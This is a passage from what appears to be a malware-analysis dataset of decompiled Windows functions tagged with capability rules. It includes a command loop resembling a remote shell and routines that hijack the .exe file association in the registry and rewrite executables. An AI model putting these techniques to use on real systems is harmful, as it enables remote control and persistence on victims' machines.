*0x444a78;\n            iVar9 = (*_sym.imp.WSOCK32.dll_WSAStartup)(0x101, auStack1480, uVar8);\n            if (((-1 < iVar9) && (uStack1088 = (*_sym.imp.WSOCK32.dll_socket)(2, 1, 0),  uStack1088 != 0xffffffff)) &&\n               (iStack1068 = (*_sym.imp.WSOCK32.dll_gethostbyname)(uVar5),  iStack1068 != 0)) {\n                auStack1084[0] = 2;\n                auStack1080[0] = ***(iStack1068 + 0xc);\n                uVar7 = (*_sym.imp.WSOCK32.dll_htons)(uVar6);\n                uStack1088 = uStack1088 & 0xffff | uVar7 << 0x10;\n                (*_sym.imp.WSOCK32.dll_connect)(uStack1092, &uStack1088, 0x10);\n            }\n            pcVar4 = _sym.imp.WSOCK32.dll_recv;\n            piStack20 = NULL;\n            iVar9 = (*_sym.imp.WSOCK32.dll_recv)(uStack1088, auStack1064, 0x400, 0);\n            while (0 < iVar9) {\n                *(auStack1080 + iVar9) = 0;\n                pcVar10 = fcn.0040b6a0(auStack1080);\n                if (pcVar10 != NULL) {\n                    pcVar11 = pcVar10;\n                    do {\n                        cVar1 = *pcVar11;\n                        pcVar11 = pcVar11 + 1;\n                    } while (cVar1 != '\\0');\n                    (*_sym.imp.WSOCK32.dll_send)(uStack1104, pcVar10, pcVar11 - (pcVar10 + 1), 0);\n                    fcn.00420c59(pcVar10);\n                }\n                (*_sym.imp.KERNEL32.DLL_Sleep)(100);\n                iVar9 = (*pcVar4)(uStack1108, auStack1084, 0x400, 0);\n            }\n            (*_sym.imp.KERNEL32.DLL_Sleep)(1000);\n            uStack40 = 0xffffffff;\n            (*_sym.imp.WSOCK32.dll_closesocket)(uStack1108);\n            uVar16 = fcn.00420e6f(0);\n            iVar9 = uVar16 >> 0x20;\n            uVar2 = uVar16 < iVar14;\n            uVar3 = iVar9 - iVar12;\n            bVar13 = uVar3 - uVar2 < 0;\n        } while ((bVar13) ||\n                ((uVar3 == uVar2 || (SBORROW4(iVar9, iVar12) != SBORROW4(uVar3, uVar2)) != bVar13 &&\n                 (uVar16 - iVar14 < 300))));\n    }\n    *in_FS_OFFSET = piStack20;\n    fcn.00420bc6(in_stack_fffffa24);\n    return;\n}\n",
        "token_count": 1101
    },
    "00420ec0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00420ec0(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint8_t **arg_8h_00;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004276c0(0x43f028, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    if (arg_8h_00 == NULL) {\n        puVar3 = fcn.00426e0a();\n        *puVar3 = 0x16;\n        fcn.00426db8();\n        goto code_r0x00420fab;\n    }\n    fcn.00421602(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar4 = fcn.00427b5d(arg_8h_00);\n        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n            iVar5 = 0x441730;\n        }\n        else {\n            iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x444b80);\n        }\n        if ((*(iVar5 + 0x24) & 0x7f) == 0) {\n            if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n                iVar5 = 0x441730;\n            }\n            else {\n                iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x444b80);\n            }\n            if ((*(iVar5 + 0x24) & 0x80) == 0) goto code_r0x00420f76;\n        }\n        puVar3 = fcn.00426e0a();\n        *puVar3 = 0x16;\n        fcn.00426db8();\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x00420f76:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar4 = fcn.00425e77(*(unaff_EBP + 8), arg_8h_00);\n        }\n        else {\n            uVar2 = *(unaff_EBP + 8);\n            **arg_8h_00 = uVar2;\n            uVar4 = uVar2;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar4;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00420fb4();\ncode_r0x00420fab:\n    fcn.00427705();\n    return;\n}\n",
        "token_count": 800
    },
    "00421b88": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00421b88(uint arg_8h)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t **arg_8h_00;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004276c0(0x43f0d0, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == NULL) {\n        puVar2 = fcn.00426e0a();\n        *puVar2 = 0x16;\n        fcn.00426db8();\n        goto code_r0x00421c6b;\n    }\n    fcn.00421602(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar3 = fcn.00427b5d(arg_8h_00);\n        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n            iVar4 = 0x441730;\n        }\n        else {\n            iVar4 = (uVar3 & 0x1f) * 0x40 + *((uVar3 >> 5) * 4 + 0x444b80);\n        }\n        if ((*(iVar4 + 0x24) & 0x7f) == 0) {\n            if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n                iVar4 = 0x441730;\n            }\n            else {\n                iVar4 = (uVar3 & 0x1f) * 0x40 + *((uVar3 >> 5) * 4 + 0x444b80);\n            }\n            if ((*(iVar4 + 0x24) & 0x80) == 0) goto code_r0x00421c3e;\n        }\n        puVar2 = fcn.00426e0a();\n        *puVar2 = 0x16;\n        fcn.00426db8();\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x00421c3e:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar3 = fcn.00428b69(arg_8h_00);\n        }\n        else {\n            uVar3 = **arg_8h_00;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar3;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00421c74();\ncode_r0x00421c6b:\n    fcn.00427705();\n    return;\n}\n",
        "token_count": 763
    },
    "0042d5ca": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0042d5ca(void)\n\n{\n    int32_t unaff_ESI;\n    \n    if (unaff_ESI != -1) {\n        fcn.0043293a(unaff_ESI);\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "00405640": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_19ch\n\nvoid __cdecl fcn.00405640(char *arg_8h)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    char cVar3;\n    uint *puVar4;\n    ushort *arg_8h_00;\n    int32_t iVar5;\n    char *pcVar6;\n    uint arg_8h_01;\n    uint *in_ECX;\n    uint32_t uVar7;\n    ushort *puVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    bool bVar12;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    int32_t hKey;\n    uint var_188h;\n    uint32_t var_4h;\n    \n    var_4h = *0x441480 ^ &stack0xfffffffc;\n    cVar3 = fcn.004055d0();\n    if (cVar3 == '\\0') {\n        var_188h._0_1_ = cVar3;\n    }\n    puVar4 = in_ECX;\n    do {\n        cVar3 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar3 != '\\0');\n    arg_8h_00 = fcn.0041ff97(puVar4 + (0x80 - (in_ECX + 1)));\n    *arg_8h_00 = 0x22;\n    puVar4 = in_ECX;\n    do {\n        cVar3 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar3 != '\\0');\n    puVar10 = arg_8h_00 + -1;\n    do {\n        pcVar6 = puVar10 + 1;\n        puVar10 = puVar10 + 1;\n    } while (*pcVar6 != '\\0');\n    puVar11 = in_ECX;\n    for (uVar7 = puVar4 - in_ECX >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar10 = *puVar11;\n        puVar11 = puVar11 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    for (uVar7 = puVar4 - in_ECX & 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar10 = *puVar11;\n        puVar11 = puVar11 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    puVar4 = arg_8h_00 + -1;\n    do {\n        puVar10 = puVar4;\n        puVar4 = puVar10 + 1;\n    } while (*(puVar10 + 1) != '\\0');\n    *(puVar10 + 1) = str.___START___1___._0_4_;\n    *(puVar10 + 5) = str.___START___1___._4_4_;\n    *(puVar10 + 9) = str.___START___1___._8_4_;\n    *(puVar10 + 0xd) = str.___START___1___._12_4_;\n    *(puVar10 + 0x11) = str.___START___1___[16];\n    puVar4 = &var_188h;\n    puVar8 = arg_8h_00;\n    do {\n        uVar1 = *puVar4;\n        bVar12 = uVar1 < *puVar8;\n        if (uVar1 != *puVar8) {\ncode_r0x00405740:\n            iVar5 = (1 - bVar12) - (bVar12 != 0);\n            goto code_r0x00405745;\n        }\n        if (uVar1 == 0) break;\n        uVar1 = *(puVar4 + 1);\n        bVar12 = uVar1 < *(puVar8 + 1);\n        if (uVar1 != *(puVar8 + 1)) goto code_r0x00405740;\n        puVar4 = puVar4 + 2;\n        puVar8 = puVar8 + 1;\n    } while (uVar1 != 0);\n    iVar5 = 0;\ncode_r0x00405745:\n    if (iVar5 != 0) {\n        pcVar6 = arg_8h;\n        do {\n            cVar3 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar3 != '\\0');\n        arg_8h_01 = fcn.0041ff97(pcVar6 + (0x80 - (arg_8h + 1)));\n        puVar4 = in_ECX;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        puVar10 = fcn.0041ff97(puVar4 + (0x80 - (in_ECX + 1)));\n        fcn.00420bd5(arg_8h_01, \"Software\\\\Classes\\\\%s\", arg_8h);\n        *puVar10 = str.Application._0_4_;\n        puVar10[1] = str.Application._4_4_;\n        puVar10[2] = str.Application._8_4_;\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, arg_8h_01, 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, 0, 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        fcn.00420bd5(arg_8h_01, \"Software\\\\Classes\\\\%s\", arg_8h);\n        puVar4 = \"application/x-msdownload\";\n        puVar11 = puVar10;\n        for (iVar5 = 6; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar11 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        *puVar11 = *puVar4;\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, arg_8h_01, 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, \"Content-Type\", 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        fcn.00420bd5(arg_8h_01, \"Software\\\\Classes\\\\%s\\\\DefaultIcon\", arg_8h);\n        *puVar10 = *0x43c6d8;\n        *(puVar10 + 2) = *0x43c6da;\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, arg_8h_01, 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, 0, 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        fcn.00420bd5(arg_8h_01, \"Software\\\\Classes\\\\%s\\\\shell\\\\open\\\\command\", arg_8h);\n        *puVar10 = 0x22;\n        puVar4 = in_ECX;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        puVar11 = puVar10 + -1;\n        do {\n            pcVar6 = puVar11 + 1;\n            puVar11 = puVar11 + 1;\n        } while (*pcVar6 != '\\0');\n        puVar9 = in_ECX;\n        for (uVar7 = puVar4 - in_ECX >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n            *puVar11 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        for (uVar7 = puVar4 - in_ECX & 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n            *puVar11 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        puVar4 = puVar10 + -1;\n        do {\n            puVar11 = puVar4;\n            puVar4 = puVar11 + 1;\n        } while (*(puVar11 + 1) != '\\0');\n        *(puVar11 + 1) = str.___START___1___._0_4_;\n        *(puVar11 + 5) = str.___START___1___._4_4_;\n        *(puVar11 + 9) = str.___START___1___._8_4_;\n        *(puVar11 + 0xd) = str.___START___1___._12_4_;\n        *(puVar11 + 0x11) = str.___START___1___[16];\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, arg_8h_01, 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, 0, 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        fcn.00420bd5(arg_8h_01, \"Software\\\\Classes\\\\%s\\\\shell\\\\open\\\\command\", arg_8h);\n        *puVar10 = str.__1___._0_4_;\n        puVar10[1] = str.__1___._4_4_;\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, arg_8h_01, 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, \"IsolatedCommand\", 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        fcn.00420bd5(arg_8h_01, \"Software\\\\Classes\\\\%s\\\\shell\\\\runas\\\\command\", arg_8h);\n        *puVar10 = str.__1___._0_4_;\n        puVar10[1] = str.__1___._4_4_;\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, arg_8h_01, 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, 0, 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        fcn.00420bd5(arg_8h_01, \"Software\\\\Classes\\\\%s\\\\shell\\\\runas\\\\command\", arg_8h);\n        *puVar10 = str.__1___._0_4_;\n        puVar10[1] = str.__1___._4_4_;\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, arg_8h_01, 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, \"IsolatedCommand\", 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        fcn.00420bd5(puVar10, 0x43c744, arg_8h);\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, \"Software\\\\Classes\\\\.exe\", 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, 0, 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        puVar4 = \"application/x-msdownload\";\n        puVar11 = puVar10;\n        for (iVar5 = 6; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar11 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        *puVar11 = *puVar4;\n        pcVar2 = _sym.imp.ADVAPI32.dll_RegCreateKeyExA;\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, \"Software\\\\Classes\\\\.exe\", 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, \"Content-Type\", 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        *puVar10 = *0x43c6d8;\n        *(puVar10 + 2) = *0x43c6da;\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*pcVar2)(0x80000001, \"Software\\\\Classes\\\\.exe\\\\DefaultIcon\", 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, 0, 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        *puVar10 = 0x22;\n        puVar4 = in_ECX;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        puVar11 = puVar10 + -1;\n        do {\n            pcVar6 = puVar11 + 1;\n            puVar11 = puVar11 + 1;\n        } while (*pcVar6 != '\\0');\n        puVar9 = in_ECX;\n        for (uVar7 = puVar4 - in_ECX >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n            *puVar11 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        for (uVar7 = puVar4 - in_ECX & 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n            *puVar11 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        puVar4 = puVar10 + -1;\n        do {\n            puVar11 = puVar4;\n            puVar4 = puVar11 + 1;\n        } while (*(puVar11 + 1) != '\\0');\n        *(puVar11 + 1) = str.___START___1___._0_4_;\n        *(puVar11 + 5) = str.___START___1___._4_4_;\n        *(puVar11 + 9) = str.___START___1___._8_4_;\n        *(puVar11 + 0xd) = str.___START___1___._12_4_;\n        *(puVar11 + 0x11) = str.___START___1___[16];\n        pcVar2 = _sym.imp.ADVAPI32.dll_RegCreateKeyExA;\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                  (0x80000001, \"Software\\\\Classes\\\\.exe\\\\shell\\\\open\\\\command\", 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, 0, 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        *puVar10 = str.__1___._0_4_;\n        puVar10[1] = str.__1___._4_4_;\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*pcVar2)(0x80000001, \"Software\\\\Classes\\\\.exe\\\\shell\\\\open\\\\command\", 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, \"IsolatedCommand\", 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        *puVar10 = str.__1___._0_4_;\n        puVar10[1] = str.__1___._4_4_;\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*pcVar2)(0x80000001, \"Software\\\\Classes\\\\.exe\\\\shell\\\\runas\\\\command\", 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, 0, 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        *puVar10 = str.__1___._0_4_;\n        puVar10[1] = str.__1___._4_4_;\n        puVar4 = puVar10;\n        do {\n            cVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar3 != '\\0');\n        (*pcVar2)(0x80000001, \"Software\\\\Classes\\\\.exe\\\\shell\\\\runas\\\\command\", 0, 0, 0, 0x2001f, 0, &hKey, 0);\n        if (hKey != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, \"IsolatedCommand\", 0, 1, puVar10, puVar4 - (puVar10 + 1));\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        fcn.00420c59(arg_8h_01);\n        fcn.00420c59(puVar10);\n    }\n    fcn.00420c59(arg_8h_00);\n    fcn.00420bc6(arg_8h_00);\n    return;\n}\n",
        "token_count": 5248
    },
    "004060f0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.004060f0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    puVar5 = 0x43d734;\n    var_8h = 0;\n    do {\n        iVar2 = fcn.0041ff97(*puVar5 + 1);\n        uVar3 = 0;\n        uVar4 = uVar3;\n        if (*puVar5 != 0) {\n            do {\n                uVar3 = uVar4 + 1;\n                *(uVar4 + iVar2) = *(puVar5[1] + uVar4) ^ *(puVar5 + -1);\n                uVar4 = uVar3;\n            } while (uVar3 < *puVar5);\n        }\n        *(uVar3 + iVar2) = 0;\n        var_4h = iVar2;\n        if ((&var_4h < *0x444b40) && (*0x444b3c <= &var_4h)) {\n            iVar2 = &var_4h - *0x444b3c;\n            if (*0x444b40 == *0x444b44) {\n                uVar4 = *0x444b40 - *0x444b3c >> 2;\n                if (0x3ffffffe < uVar4) {\ncode_r0x0040623c:\n                    fcn.00420641(\"vector<T> too long\");\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                uVar4 = uVar4 + 1;\n                uVar3 = *0x444b44 - *0x444b3c >> 2;\n                if (uVar3 < uVar4) {\n                    if (0x3fffffff - (uVar3 >> 1) < uVar3) {\n                        uVar3 = 0;\n                    }\n                    else {\n                        uVar3 = uVar3 + (uVar3 >> 1);\n                    }\n                    if (uVar3 < uVar4) {\n                        uVar3 = uVar4;\n                    }\n                    fcn.00406280(uVar3);\n                }\n            }\n            if (*0x444b40 != NULL) {\n                **0x444b40 = (*0x444b3c)[iVar2 >> 2];\n            }\n        }\n        else {\n            if (*0x444b40 == *0x444b44) {\n                uVar4 = *0x444b40 - *0x444b3c >> 2;\n                if (0x3ffffffe < uVar4) goto code_r0x0040623c;\n                uVar4 = uVar4 + 1;\n                uVar3 = *0x444b44 - *0x444b3c >> 2;\n                if (uVar3 < uVar4) {\n                    if (0x3fffffff - (uVar3 >> 1) < uVar3) {\n                        uVar3 = 0;\n                    }\n                    else {\n                        uVar3 = uVar3 + (uVar3 >> 1);\n                    }\n                    if (uVar3 < uVar4) {\n                        uVar3 = uVar4;\n                    }\n                    fcn.00406280(uVar3);\n                }\n            }\n            if (*0x444b40 != NULL) {\n                **0x444b40 = iVar2;\n            }\n        }\n        var_8h = var_8h + 0xc;\n        *0x444b40 = *0x444b40 + 1;\n        puVar5 = puVar5 + 3;\n        if (0x1df < var_8h) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 861
    },
    "004049c0": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004049c0(uint arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    int32_t arg_ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uchar *var_8h;\n    uint var_4h;\n    \n    uVar2 = fcn.00420e6f(0);\n    fcn.00420c64(uVar2);\n    iVar3 = fcn.00421d73(arg_8h, 0x43c2fc);\n    if (iVar3 != 0) {\n        iVar4 = fcn.0041ff97(0x40);\n        uVar11 = 0;\n        do {\n            uVar1 = fcn.00421b88(iVar3);\n            *(uVar11 + iVar4) = uVar1;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x40);\n        uVar11 = *(iVar4 + 0x3c);\n        uVar2 = fcn.004224cc(iVar3);\n        fcn.004225bb(iVar3, 0, 2);\n        uVar5 = fcn.004224cc(iVar3);\n        fcn.004225bb(iVar3, uVar2, 0);\n        uVar6 = uVar5 - uVar11;\n        fcn.004225bb(iVar3, uVar11, 0);\n        puVar7 = fcn.0041ff97(uVar6);\n        puVar9 = puVar7;\n        uVar12 = uVar11;\n        while (uVar12 < uVar5) {\n            uVar1 = fcn.00421b88(iVar3);\n            *puVar9 = uVar1;\n            uVar8 = uVar12 + 1;\n            bVar13 = uVar12 != 0;\n            uVar12 = uVar8;\n            if (bVar13) {\n                puVar9 = puVar9 + 1;\n            }\n        }\n        uVar11 = uVar11 - 0x40;\n        fcn.004225bb(iVar3, 0x41, 0);\n        puVar9 = fcn.0041ff97(uVar11);\n        uVar12 = 0x41;\n        var_8h = puVar9;\n        if (0x41 < uVar11) {\n            do {\n                uVar1 = fcn.00421b88(iVar3);\n                uVar5 = uVar12 + 1;\n                *var_8h = uVar1;\n                if (uVar12 != 0) {\n                    var_8h = var_8h + 1;\n                }\n                uVar12 = uVar5;\n            } while (uVar5 < uVar11);\n        }\n        fcn.004226f5(iVar3);\n        iVar3 = fcn.00421d73(arg_8h, 0x43c304);\n        if (iVar3 != 0) {\n            uVar12 = 0;\n            do {\n                fcn.00420ec0(*(uVar12 + iVar4), iVar3);\n                uVar12 = uVar12 + 1;\n            } while (uVar12 < 0x40);\n            for (; uVar11 != 0; uVar11 = uVar11 - 1) {\n                arg_ch = iVar3;\n                iVar10 = fcn.00420c76();\n                fcn.00420ec0(iVar10 % 0xff, arg_ch);\n            }\n            uVar11 = 0;\n            if (uVar6 != 0) {\n                do {\n                    fcn.00420ec0(puVar7[uVar11], iVar3);\n                    uVar11 = uVar11 + 1;\n                } while (uVar11 < uVar6);\n            }\n            fcn.004226f5(iVar3);\n            fcn.00420c59(puVar7);\n            fcn.00420c59(puVar9);\n            fcn.00420c59(iVar4);\n            return 1;\n        }\n        fcn.00420c59(iVar4);\n    }\n    return 0;\n}\n",
        "token_count": 1016
    },
    "00422b30": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
